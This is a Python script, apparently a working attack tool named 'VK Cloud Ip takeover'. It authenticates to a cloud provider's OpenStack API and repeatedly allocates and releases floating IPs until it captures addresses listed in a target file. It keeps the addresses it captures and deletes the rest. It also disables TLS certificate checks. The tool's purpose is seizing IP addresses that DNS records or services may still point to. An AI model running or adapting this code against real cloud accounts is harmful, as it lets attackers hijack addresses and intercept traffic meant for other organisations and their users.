import requests
import argparse
import json
import time
import sys
import ipaddress
from itertools import cycle

from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


api_catalog = None
token = None
token_time = None
proxy = None
ips_subs = []
owned_ips = []


def delete_float_ip(ip_id):
    res = requests.delete(network_url + '/v2.0/floatingips/' + ip_id, headers={'X-Auth-Token':token}, proxies=proxy, verify=False)


def create_float_ip(subid):
    data = '{"floatingip": {"floating_network_id": "' + args.nid + '", "subnet_id": "' + subid + '"}}'
    headers = {"Content-Type": "application/json; charset=utf-8"}
    res = requests.post(network_url + '/v2.0/floatingips' , data, headers={'X-Auth-Token':token}, proxies=proxy, verify=False)
    if '"floatingip":' not in res.text:
        return False
    
    obj = json.loads(res.text)
    return obj["floatingip"]


def get_subnets():
    res = requests.get(network_url + '/v2.0/subnets', headers={'X-Auth-Token':token}, proxies=proxy, verify=False)
    obj = json.loads(res.text)
    return obj["subnets"]


def subnet_from_ip(ip):
    ip_int = int(ipaddress.IPv4Address(ip))
    for subnet in subnets:
        for pool in subnet["allocation_pools"]:
            start = int(ipaddress.IPv4Address(pool["start"]))
            end = int(ipaddress.IPv4Address(pool["end"]))
            if ip_int in range(start, end):
                return subnet

    return False


def update_token():
    global token_time, api_catalog, token
    data = (
        '{"auth": {"identity": {"methods": ["password"], "password": '
        '{"user": {"password": "' + args.p + '", "name": "' + args.u + '", "domain": {"name": "users"}}}}, '
        '"scope": {"project": {"id": "' + args.pid + '"}}}}'
    )
    res = requests.post(args.api + '/v3/auth/tokens', data, proxies=proxy, verify=False)
    
    api_catalog = json.loads(res.text)
    token_time = time.time()
    token = res.headers['X-Subject-Token']


def get_network_endpoint():
    network = next( x for x in api_catalog['token']['catalog'] if x['type']=='network' )
    network_endpoint = next( x for x in network['endpoints'] if x['region_id']==args.rid)
    return network_endpoint['url']


def worker():
    for sub_id in cycle( set([x["sub_id"] for x in ips_subs]) ):
        if (time.time() - token_time) / 60 > args.tttl:
            update_token()
        ips_to_del = []
        if len(owned_ips) >= args.ipq:
            return 
        for i in range(args.ipq - len(owned_ips)):
            ip = create_float_ip(sub_id)
            # no availble ip in subnet etc
            if not ip:
                break
            print(f"ip created {ip['floating_ip_address']}", file=sys.stderr)
            if ip['floating_ip_address'] in [x["ip"] for x in ips_subs]:
                owned_ips.append(ip)
                print (f"!!! IP FINDED {ip['floating_ip_address']} !!!")
            else:
                ips_to_del.append(ip)
        
        for ip in ips_to_del:
            delete_float_ip(ip['id'])


if __name__ == "__main__":

    ip_to_takeover = []

    parser = argparse.ArgumentParser(description='VK Cloud Ip takeover')
    parser.add_argument('-api', type=str, help='Api url', default='https://infra.mail.ru:35357')
    parser.add_argument('-u', type=str, help='Username', required=True)
    parser.add_argument('-p', type=str, help='Password', required=True)
    parser.add_argument('-pid', type=str, help='Project id', required=True)
    parser.add_argument('-nid', type=str, help='Network id', required=True)
    parser.add_argument('-rid', type=str, help='Region id', default='RegionOne')
    parser.add_argument('-tttl', type=int, help='Token ttl (minutes)', default=50)
    parser.add_argument('-ipq', type=int, help='floating ip quota', default=5)
    parser.add_argument('-ipf', type=argparse.FileType(mode='r', encoding='UTF-8'), help='File with ip\'s to takeover', required=True)
    parser.add_argument('-proxy', type=str, help='Proxy (http://127.0.0.1:8080)')

    args = parser.parse_args()

    if args.proxy:
        proxy = {'http':args.proxy, 'https':args.proxy}

    update_token()
    network_url = get_network_endpoint()
    subnets = get_subnets()

    #load ip, check if ip is in subnet
    with args.ipf:
        for l in args.ipf:
            ip = l.strip()
            #remove dups
            if ip in [x["ip"] for x in ips_subs]:
                continue
            ip_sub = subnet_from_ip(ip)
            if ip_sub:
                print(f"{ip} subnet is {ip_sub['id']}")
                ips_subs.append({"ip":ip, "sub_id": ip_sub["id"]})
            else:
                print(f"there is no subnet for ip {ip}")

    worker()
